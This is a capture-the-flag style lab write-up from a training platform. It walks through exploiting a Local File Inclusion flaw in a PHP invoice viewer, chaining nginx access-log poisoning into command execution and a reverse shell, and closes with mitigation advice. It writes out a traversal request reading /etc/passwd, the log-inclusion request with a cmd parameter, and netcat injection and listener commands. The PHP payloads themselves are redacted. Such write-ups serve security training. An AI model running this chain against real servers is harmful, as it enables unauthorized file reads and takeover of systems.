---
title: "Local File Inclusion – Log Poisoning to Remote Code Execution | Venomous"
date: 2026-03-29 13:00:00 +0530
categories: [Penetration Testing]
tags: [
  lfi,
  local-file-inclusion,
  directory-traversal,
  log-poisoning,
  remote-code-execution,
  reverse-shell,
  nginx,
  linux,
  hackviser
]
platform: Hackviser
author: Shivansh Sharma
image:
  path: /assets/images/posts/path-traversal.webp
  alt: Local File Inclusion and Log Poisoning Exploitation
---

## Overview

This lab demonstrates exploitation of a Local File Inclusion (LFI) vulnerability combined with log poisoning to achieve remote code execution on a web server.

The attack leverages improper file handling in a web application to read sensitive files and inject malicious payloads into server logs, which are later executed.

---

## Objective

- Identify directory traversal and LFI vulnerability  
- Access sensitive files on the server  
- Perform log poisoning  
- Achieve remote code execution  
- Obtain a reverse shell  

---

## Reconnaissance

Initial service enumeration:

```bash
nmap -sV <target_ip>
```

Result:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
```

Directory enumeration:

```bash
gobuster dir -u <url> -w <wordlist_path>
```

Discovered directories included:

- `/invoices`
- `/css`, `/js`, `/fonts`

---

## Exploitation

### Identifying LFI

The application allowed downloading invoices via:

```
/show-invoice.php?invoice=invoice-XXXX.html
```

The `invoice` parameter was tested for path traversal:

```
/show-invoice.php?invoice=../../../../../../../../etc/passwd
```

Successful response confirmed LFI, exposing system files.

### Log Poisoning

To achieve code execution, server logs were targeted.

A malicious payload was injected into the web server logs using a crafted HTTP request:

```bash
nc <target_ip> 80
```

Payload:

```
GET /[php-system-exec-payload] HTTP/1.1
Host: <target_ip>
```

> The injected request line embeds a server-side scripting block inside the URL path. When the web server logs this request, the scripting block gets written into the access log. The block uses a built-in execution function that runs the value of a URL parameter as an OS-level shell command.

This payload was written into the Nginx access log.

### Remote Code Execution via LFI

The poisoned log file was then accessed through the LFI vulnerability:

```
/show-invoice.php?invoice=../../../../../../../../var/log/nginx/access.log&cmd=id
```

This executed system commands on the server.

### Reverse Shell

A listener was started on the attacker machine:

```bash
nc -lvp 1337
```

Payload:

```
GET /[php-passthru-reverse-shell-payload] HTTP/1.1
Host: <target_ip>
Connection: close
```

> Similar to the previous step, this injects a server-side scripting block into the log. Instead of running a single command, it uses a stream execution function to spawn an interactive shell process and tunnel it back to the attacker's machine over the network on a specified port.

After accessing the log file again via LFI, a connection was established back to the attacker machine.

---

## Proof of Exploitation

- Successful file read via LFI
- Execution of system commands
- Reverse shell obtained from target

---

## Impact

This vulnerability chain allows:

- Arbitrary file read access
- Remote code execution
- Full system compromise
- Unauthorized access to sensitive data

Such vulnerabilities can lead to complete takeover of the server.

---

## Mitigation

- Validate and sanitize user-supplied file paths
- Prevent directory traversal using strict input validation
- Restrict access to sensitive system files
- Disable execution of user-controlled input
- Secure and monitor server log files
- Implement least privilege for web services

---

## Real-World Insight

LFI vulnerabilities are often underestimated but can become critical when combined with log poisoning or file upload flaws. Many real-world breaches occur due to chaining such vulnerabilities.

This type of issue is commonly associated with improper input handling and aligns with risks highlighted by OWASP.

---

## Conclusion

This lab demonstrates how a simple file inclusion flaw can escalate into full remote code execution when combined with log poisoning. Proper input validation and secure handling of server-side resources are essential to prevent such attacks.